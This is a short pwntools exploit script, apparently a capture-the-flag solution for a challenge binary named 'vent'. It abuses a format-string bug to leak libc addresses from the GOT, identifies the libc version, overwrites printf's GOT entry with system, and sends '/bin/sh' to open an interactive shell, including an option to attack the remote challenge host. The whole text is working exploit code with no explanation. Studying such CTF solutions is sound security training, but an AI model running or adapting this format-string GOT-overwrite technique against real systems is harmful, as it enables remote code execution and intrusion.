from pwn import *

exe = ELF('./vent_patched')
libc = ELF('./libc.so')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+116
        continue
    """)
elif args.REMOTE:
    io = remote("vent.squ1rrel-ctf-codelab.kctf.cloud", 1337)

def write(addr, data, offset):
    writes = {addr: data}
    payload = fmtstr_payload(offset, writes, write_size='short')
    io.sendline(payload)

def read(addr, offset):
    io.sendline(f'%{offset + 1}$sXXXX'.encode() + pack(addr))
    io.recvuntil(b'said:\n')
    addr = io.recvline().split(b'XXXX')[0]
    return int.from_bytes(addr, 'little')

# ************************************************************
# libc version 特定
# ************************************************************
print(f'{hex(read(exe.got.puts, 8)) = }')
print(f'{hex(read(exe.got.printf, 8)) = }')
print(f'{hex(read(exe.got.fgets, 8)) = }')
# hex(read(exe.got.puts, 8)) = '0x7fcdd1f5c420'
# hex(read(exe.got.printf, 8)) = '0x7fcdd1f39c90'
# hex(read(exe.got.fgets, 8)) = '0x7fcdd1f5a630'
# → https://libc.blukat.me/?q=puts%3A0x7fcdd1f5c420%2Cprintf%3A0x7fcdd1f39c90%2Cfgets%3A0x7fcdd1f5a630&l=libc6_2.31-0ubuntu9.10_amd64
libc.address = read(exe.got.puts, 8) - libc.symbols.puts

# ************************************************************
# GOT Overwrite
# ************************************************************
write(exe.got.printf, libc.symbols.system, 8)
io.sendline(b'/bin/sh\x00')
io.interactive()
